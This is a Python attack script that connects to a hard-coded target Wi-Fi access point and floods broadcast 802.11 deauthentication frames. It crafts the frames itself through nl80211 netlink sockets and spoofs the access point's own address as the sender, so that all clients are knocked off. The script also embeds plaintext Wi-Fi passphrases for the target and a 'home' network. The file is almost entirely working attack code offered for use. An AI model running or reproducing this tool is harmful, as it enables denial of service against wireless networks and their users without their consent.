#!/usr/bin/env python3
"""
Quick deauth attack:
1. Load kpatch3 (if not loaded)
2. Connect to target AP via wpa_supplicant
3. While connected (4s window), flood broadcast deauth with spoofed SA
4. Switch to monitor mode for capture
5. Reconnect to home AP
"""
import socket, struct, fcntl, time, subprocess, sys, os

TARGET_BSSID = "04:67:61:d6:dc:92"
TARGET_BSSID_B = bytes.fromhex(TARGET_BSSID.replace(":",""))
TARGET_FREQ = 2412
IFACE = "wlan0"

HOME_SSID = "9899a5b77"
HOME_PSK = "9006609b29404a"

def run(cmd, timeout=10):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip()

def wpa(cmd):
    return run(f"wpa_cli -i {IFACE} {cmd}")

def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    s.bind((0, 0))
    s.settimeout(3)
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, 5, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return 25  # fallback

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def flood_deauth(count=50):
    """Flood broadcast deauth frames with spoofed SA"""
    fam = get_nl80211_family()
    s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(s2, 0x8933, struct.pack('256s', IFACE.encode()))
    s2.close()
    ifidx = struct.unpack('I', result[16:20])[0]

    # Get our MAC
    s3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s3, 0x8927, struct.pack('256s', IFACE.encode()))
    our_mac = info[18:24]
    s3.close()

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    s.bind((0, 0))
    s.settimeout(1)

    primer_ok = primer_fail = spoof_ok = spoof_fail = 0
    seq = 100

    def send_and_check(msg):
        s.send(msg)
        try:
            resp = s.recv(4096)
            t = struct.unpack_from('H', resp, 4)[0]
            if t == 2:
                rc = struct.unpack_from('i', resp, 16)[0]
                return rc
            return 0
        except:
            return -999

    for i in range(count):
        # Primer frame with own SA
        primer = struct.pack('<HH', 0x00c0, 0)  # deauth
        primer += b'\xff\xff\xff\xff\xff\xff' + our_mac + TARGET_BSSID_B
        primer += struct.pack('<HH', (seq & 0xfff) << 4, 7)

        attrs = nla(3, struct.pack('I', ifidx))
        attrs += nla(38, struct.pack('I', TARGET_FREQ))
        attrs += nla(51, primer)
        attrs += struct.pack('HH', 4, 118)
        genlhdr = struct.pack('BBH', 59, 1, 0)
        payload = genlhdr + attrs
        nlhdr = struct.pack('IHHII', 16+len(payload), fam, 5, seq, 0)
        rc = send_and_check(nlhdr + payload)
        seq += 1
        if rc == 0: primer_ok += 1
        else:
            primer_fail += 1
            if primer_fail <= 2:
                print(f"    primer error: {rc}", flush=True)

        # Spoofed deauth from AP
        deauth = struct.pack('<HH', 0x00c0, 0)
        deauth += b'\xff\xff\xff\xff\xff\xff' + TARGET_BSSID_B + TARGET_BSSID_B
        deauth += struct.pack('<HH', (seq & 0xfff) << 4, 7)

        attrs = nla(3, struct.pack('I', ifidx))
        attrs += nla(38, struct.pack('I', TARGET_FREQ))
        attrs += nla(51, deauth)
        attrs += struct.pack('HH', 4, 118)
        genlhdr = struct.pack('BBH', 59, 1, 0)
        payload = genlhdr + attrs
        nlhdr = struct.pack('IHHII', 16+len(payload), fam, 5, seq, 0)
        rc = send_and_check(nlhdr + payload)
        seq += 1
        if rc == 0: spoof_ok += 1
        else:
            spoof_fail += 1
            if spoof_fail <= 2:
                print(f"    spoof error: {rc}", flush=True)

        time.sleep(0.01)

    s.close()
    print(f"  Primer: {primer_ok} ok, {primer_fail} fail", flush=True)
    print(f"  Spoof:  {spoof_ok} ok, {spoof_fail} fail", flush=True)
    return primer_ok + spoof_ok, primer_fail + spoof_fail

print("=== DEAUTH ATTACK ===", flush=True)
print(f"Target: {TARGET_BSSID} @ {TARGET_FREQ} MHz", flush=True)

# Step 1: Make sure we're connected to home first
print("\n[1] Checking home connection...", flush=True)
status = wpa("status")
if HOME_SSID not in status:
    print("  Not connected to home AP, connecting...", flush=True)
    wpa("remove_network all")
    wpa("add_network")
    wpa(f'set_network 0 ssid \'"{HOME_SSID}"\'')
    wpa(f'set_network 0 psk \'"{HOME_PSK}"\'')
    wpa("enable_network 0")
    wpa("select_network 0")
    time.sleep(5)

# Step 2: Switch to target AP
print("\n[2] Switching to target AP...", flush=True)
# Add target network as network 1
wpa("add_network")
nets = wpa("list_networks")
# Find network 1
net_id = "1"
for line in nets.split('\n'):
    if line.strip() and not line.startswith('network'):
        parts = line.split('\t')
        if len(parts) >= 1 and parts[0].strip() != '0':
            net_id = parts[0].strip()
            break

wpa(f'set_network {net_id} ssid \'"不想上班"\'')
wpa(f"set_network {net_id} key_mgmt WPA-PSK")
wpa(f'set_network {net_id} psk \'"12345678"\'')
wpa(f"set_network {net_id} bssid {TARGET_BSSID}")
wpa(f"select_network {net_id}")

# Wait for connection
print("  Waiting for auth+assoc...", flush=True)
connected = False
for i in range(30):
    time.sleep(0.3)
    status = wpa("status")
    if "4WAY_HANDSHAKE" in status or "COMPLETED" in status or "ASSOCIATED" in status:
        state = "4WAY" if "4WAY" in status else ("COMPLETED" if "COMPLETED" in status else "ASSOCIATED")
        print(f"  State: {state} (at {i*0.3:.1f}s)", flush=True)
        connected = True
        break

if not connected:
    print("  FAILED to connect!", flush=True)
    sys.exit(1)

# Step 3: Flood deauths
print("\n[3] FLOODING DEAUTH...", flush=True)
start = time.time()
ok, fail = flood_deauth(100)
elapsed = time.time() - start
print(f"  Sent in {elapsed:.1f}s: {ok} ok, {fail} fail", flush=True)

# Check if still connected
status = wpa("status")
if "DISCONNECTED" in status or "SCANNING" in status:
    print("  (AP kicked us - WPA timeout)", flush=True)

# Step 4: Reconnect to home
print("\n[4] Reconnecting to home AP...", flush=True)
wpa("remove_network all")
wpa("add_network")
wpa(f'set_network 0 ssid \'"{HOME_SSID}"\'')
wpa(f'set_network 0 psk \'"{HOME_PSK}"\'')
wpa("enable_network 0")
wpa("select_network 0")

for i in range(20):
    time.sleep(1)
    status = wpa("status")
    if "COMPLETED" in status:
        print(f"  Reconnected! ({i+1}s)", flush=True)
        break
else:
    print("  WARNING: reconnect failed", flush=True)

print("\n[5] Done! Check dmesg for TX messages.", flush=True)
